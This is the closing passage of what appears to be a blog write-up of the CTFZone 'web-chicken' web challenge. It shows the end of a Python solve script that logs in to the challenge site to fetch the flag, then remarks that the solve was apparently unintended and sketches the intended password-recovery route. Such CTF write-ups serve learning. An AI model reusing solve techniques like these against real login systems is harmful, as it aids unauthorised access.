&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# For the sake of it&lt;/span&gt;
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://web-chicken.ctfz.one/Auth/Login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Login and get the flag&lt;/span&gt;
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;http://web-chicken.ctfz.one/Auth/Login&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;returnUrl&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;USERNAME&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;PASSWORD&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Print the flag&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Now for the funny part. Here's a message from the organizers to some people
asking for a solution on Telegram:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Telegram" class="align-center" src="https://thebabush.github.io/images/20191213-ctfzone-chicken.png"&gt;&lt;/p&gt;
&lt;p&gt;...so it looks like our solution was... unintended?&lt;/p&gt;
&lt;p&gt;The actual solution was to... guess the additional
&lt;code&gt;http://web-chicken-auth/auth/password_recovery&lt;/code&gt;
URL and pass the admin email (which was written on the website)?&lt;/p&gt;
&lt;p&gt;We will never know.&lt;/p&gt;
&lt;p&gt;Up until that point I was like "this challenge had some random things like the
password strength check, but overall it was actually tricky in a smart way".&lt;/p&gt;
&lt;p&gt;Now, if that's the &lt;em&gt;proper&lt;/em&gt; solution, I don't really know what to think anymore.&lt;/p&gt;
&lt;p&gt;But there you have it, your boy managed to use his bad web skills to actually do
some good and bring 500 points home in what seemed like the only solve to this
challenge :)&lt;/p&gt;
&lt;p&gt;Cheers,&lt;/p&gt;
&lt;p&gt;&lt;em&gt;babush&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;P.S.: During a good chunk of this challenge I had
      &lt;a href="https://jinblack.it/"&gt;jinblack&lt;/a&gt; by my side, so GG to him too.&lt;/p&gt;</content></entry></feed>